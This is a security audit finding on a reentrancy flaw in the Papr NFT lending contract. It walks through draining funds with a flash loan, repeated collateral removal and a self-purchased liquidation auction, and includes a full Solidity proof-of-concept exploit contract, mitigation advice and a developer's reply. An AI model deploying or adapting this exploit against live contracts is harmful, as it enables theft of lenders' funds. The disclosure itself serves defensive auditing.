[H-02] Stealing fund by applying reentrancy attack onremoveCollateral,startLiquidationAuction, andpurchaseLiquidationAuctionNFT
Submitted byHE1M, also found byunforgiven,hihen,rvierdiiev, andBobface
By applying reentrancy attack involving the functionsremoveCollateral,startLiquidationAuction, andpurchaseLiquidationAuctionNFT, an Attacker can steal large amount of funds.
Proof of Concept
Bob (a malicious user) deploys a contract to apply the attack. This contract is calledBobContract. Please note that all the following transactions are going to be done in one transaction.BobContract takes a flash loan of 500K USDC.BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has a price of almost 50K USDC.BobContract adds those NFTs as collateral by calling the functionaddCollateral. So_vaultInfo[BobContract][collateral.addr].count = 10.
function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {for (uint256 i = 0; i < collateralArr.length;) {_addCollateralToVault(msg.sender, collateralArr[i]);collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);unchecked {++i;}}}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98
BobContract borrows the max allowed amount ofPaprTokenthat is almost equivalent to 250K USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the functionincreaseDebt.
function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {if (_lastUpdated == block.timestamp) {return _maxDebt(totalCollateraValue, _target);}return _maxDebt(totalCollateraValue, newTarget());}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393
function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;return maxLoanUnderlying / cachedTarget;}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556
function increaseDebt(address mintTo,ERC721 asset,uint256 amount,ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo) external override {_increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138
BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 1050k50% = 250k.BobContract intends to call the functionremoveCollateral. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 950k50%).
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109
Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function_removeCollateral, thesafeTransferFromcallbacks the BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444
https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120
In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the functionstartLiquidationAuctionto put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and_vaultInfo[BobContract][collateral.addr].count = 1. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 150k50% = 25k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297
After calling the functionstartLiquidationAuction, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps,info.count = 1, so debt is larger than max debt.
if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {revert IPaprController.NotLiquidatable();}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317
Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so_vaultInfo[msg.sender][collateral.addr].count = 0. Moreover, the starting price for this NFT will be3*oraclePrice(because theauctionStartPriceMultiplier = 3), so it will be almost 3 * 50k = 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341
BobContract calls the functionpurchaseLiquidationAuctionNFTto buy it’s own NFT with id 10 which is priced at almost 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264
In this function, we have the followoing variables:collateralValueCached= 150k * 0 = 0isLastCollateral= TRUEdebtCached= 250k (same as before)maxDebtCached= 250kneededToSaveVault= 0price= 150k Please note that the functions_purchaseNFTAndUpdateVaultIfNeededand_purchaseNFTare called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72
excess= 150k Since it is larger than zero, the function_handleExcessis called.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532
fee= 15k Considering 10% fee on the excesscredit= 135ktotalOwed= 135k Since this is smaller thandebtCaches250k, the function_reduceDebtis called to reduce debt from 250k to 115k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549
remaining= 115kAll the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, 115k remains as debt.In the last part of the functionpurchaseLiquidationAuctionNFT, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.
if (isLastCollateral && remaining != 0) {/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290
Now, the control returns back to the contractPaprController. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.
if (debt > max) {revert IPaprController.ExceedsMaxDebt(debt, max);}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449
Now that the attack is finished, BobContract repays the flash loan after selling those 10 NFTs.Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob’s profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.In order to take profit and steal funds, the attacker at least should add 7 NFTs as collateral and borrow the max debt. BecausenumberOfNFT * oraclePrice * 50% > oraclePrice * 3
In the following PoC, I am showing how the attack can be applied.
Bob deploys the following contract and calls the functionattack(). It takes flash loan from AAVE, then the callback from the AAVE will executeexecuteOperation. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.
Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.
In the callback ofsafeTransferFrom, the functiononERC721Receivedis called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.
When NFTs with id 9 is removed, the functionstartLiquidationAuctionis called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.
// SPDX-License-Identifier: MITpragma solidity 0.8.0;interface ERC721 {}interface ERC20 {}struct Collateral {ERC721 addr;uint256 id;}struct OracleInfo {Message message;Sig sig;}struct Message {bytes32 id;bytes payload;uint256 timestamp;bytes signature;}struct Sig {uint8 v;bytes32 r;bytes32 s;}struct Auction {address nftOwner;uint256 auctionAssetID;ERC721 auctionAssetContract;uint256 perPeriodDecayPercentWad;uint256 secondsInPeriod;uint256 startPrice;ERC20 paymentAsset;}enum PriceKind {SPOT,TWAP,LOWER,UPPER}interface IPaprController {function addCollateral(Collateral[] calldata collateral) external;function increaseDebt(address mintTo,ERC721 asset,uint256 amount,OracleInfo calldata oracleInfo) external;function removeCollateral(address sendTo,Collateral[] calldata collateralArr,OracleInfo calldata oracleInfo) external;function startLiquidationAuction(address account,Collateral calldata collateral,OracleInfo calldata oracleInfo) external returns (Auction memory auction);function purchaseLiquidationAuctionNFT(Auction calldata auction,uint256 maxPrice,address sendTo,OracleInfo calldata oracleInfo) external;function maxDebt(uint256 totalCollateraValue)externalviewreturns (uint256);function underwritePriceForCollateral(ERC721 asset,PriceKind priceKind,OracleInfo memory oracleInfo) external returns (uint256);}interface IFundingRateController {function updateTarget() external returns (uint256);}interface IAAVE {function flashLoanSimple(address receiverAddress,address asset,uint256 amount,bytes calldata params,uint16 referralCode) external;}contract BobContract {IPaprController iPaprController;IFundingRateController iFundingRateController;IAAVE iAAVE;ERC721 nftCollectionAddress;ERC20 paprToken;Collateral[] collaterals;OracleInfo oracleInfo;uint256 numOfCallback;address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;constructor(address _paprControllerAddress,address _fundingRateControllerAddress,address _aaveAddress,ERC721 _nftCollectionAddress,OracleInfo memory _oracleInfo,ERC20 _paprToken) {iPaprController = IPaprController(_paprControllerAddress);iFundingRateController = IFundingRateController(_fundingRateControllerAddress);iAAVE = IAAVE(_aaveAddress);nftCollectionAddress = _nftCollectionAddress;oracleInfo = _oracleInfo;paprToken = _paprToken;}function attack() public {///// STEP1: taking flash loaniAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, "", 0);}function executeOperation(address[] calldata assets,uint256[] calldata amounts,uint256[] calldata premiums,address initiator,bytes calldata params) external returns (bool) {///// STEP2: buying 10 NFTs// Buy 10 NFTs that each worths almost 50k// Assume the ids are from 1 to 10///// STEP3: adding the NFTs as collateralfor (uint256 i = 0; i < 10; ++i) {collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));}iPaprController.addCollateral(collaterals);///// STEP4: borrowing as much as possibleuint256 oraclePrice = iPaprController.underwritePriceForCollateral(nftCollectionAddress,PriceKind.LOWER,oracleInfo);uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);iPaprController.increaseDebt(address(this),nftCollectionAddress,maxDebt,oracleInfo);///// STEP5: removing the NFT with id 1Collateral[] memory collateralArr = new Collateral[](1);collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});iPaprController.removeCollateral(address(this),collateralArr,oracleInfo);///// STEP16: selling 10 NFTs and repaying the flash loan// Selling the 10 NFTs// Repaying the flash loan}function onERC721Received(address from,address,uint256 _id,bytes calldata data) external returns (bytes4) {numOfCallback++;if (numOfCallback < 9) {///// STEP6 - STEP13: removing the NFTs with id 2 to 9Collateral[] memory collateralArr = new Collateral[](1);collateralArr[0] = Collateral({addr: nftCollectionAddress,id: _id + 1});iPaprController.removeCollateral(address(this),collateralArr,oracleInfo);} else {///// STEP14: starting the auction for NFT with id 10Collateral memory lastCollateral = Collateral({addr: nftCollectionAddress,id: _id + 1});iPaprController.startLiquidationAuction(address(this),lastCollateral,oracleInfo);///// STEP15: buying the NFT with id 10 on the auctionuint256 oraclePrice = iPaprController.underwritePriceForCollateral(nftCollectionAddress,PriceKind.LOWER,oracleInfo);uint256 startPrice = (oraclePrice * 3 * 1e18) /iFundingRateController.updateTarget();Auction memory auction = Auction({nftOwner: address(this),auctionAssetID: 10,auctionAssetContract: nftCollectionAddress,perPeriodDecayPercentWad: 0.7e18,secondsInPeriod: 1 days,startPrice: startPrice,paymentAsset: paprToken});iPaprController.purchaseLiquidationAuctionNFT(auction,startPrice,address(this),oracleInfo);}}}
Recommended Mitigation Steps
Adding a reentrancy guard to the involved functions can be a solution.
wilsoncusack (Backed) confirmed and commented:
There is actually a simpler attack here: add one NFT and borrow max debt. Start Liquidation auction and purchase. On purchase reenter via safeTransferFrom and add many more NFTs, borrowing max. Purchase thinks this is the borrowers last NFT and debt is set to 0. Now borrower can withdraw all other NFTs for free.We could:change removeCollateral to have the debt check BEFORE we send the NFT out, which would prevent sell to repay flowsadd a reentrancy guard on startAuction so that it can’t be composed with others.add a reentrancy guard on purchase so that it can’t be composed with others